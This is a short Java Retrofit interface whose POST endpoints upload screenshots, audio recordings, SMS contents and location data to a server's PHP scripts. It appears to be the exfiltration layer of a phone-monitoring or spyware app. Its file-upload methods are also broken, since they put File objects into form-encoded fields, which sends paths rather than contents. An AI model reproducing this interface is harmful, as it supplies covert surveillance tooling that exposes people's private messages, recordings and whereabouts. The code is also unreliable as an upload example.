package com.range.task;

import java.io.File;
import java.util.Map;

import retrofit2.Call;
import retrofit2.http.FieldMap;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.POST;

public interface ApiService {

    @FormUrlEncoded
    @POST("screenshot.php")
    Call<ParseResponse> uploadFile(@FieldMap Map<String, File> params);

    @FormUrlEncoded
    @POST("audio.php")
    Call<ParseResponse> uploadAudio(@FieldMap Map<String, File> params);

    @FormUrlEncoded
    @POST("sms.php")
    Call<ParseResponse> uploadSms(@FieldMap Map<String, String> params);

    @FormUrlEncoded
    @POST("location.php")
    Call<ParseResponse> uploadLocation(@FieldMap Map<String, String> params);

}
